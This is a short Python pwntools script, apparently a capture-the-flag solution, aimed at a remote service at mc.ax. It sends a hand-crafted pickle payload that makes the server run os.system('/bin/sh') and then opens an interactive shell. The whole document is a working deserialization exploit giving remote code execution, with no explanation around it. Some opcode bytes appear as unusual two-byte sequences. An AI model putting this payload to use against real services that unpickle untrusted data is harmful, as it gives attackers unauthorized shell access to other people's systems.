from pwn import *
p = remote('mc.ax', 31773)
p.sendlineafter('pickle: ', b'X\x02\x00\x00\x00osX\x06\x00\x00\x00systemq\xc2\x8f00h\xc2\x93(X\x07\x00\x00\x00/bin/shtR.')
p.interactive()
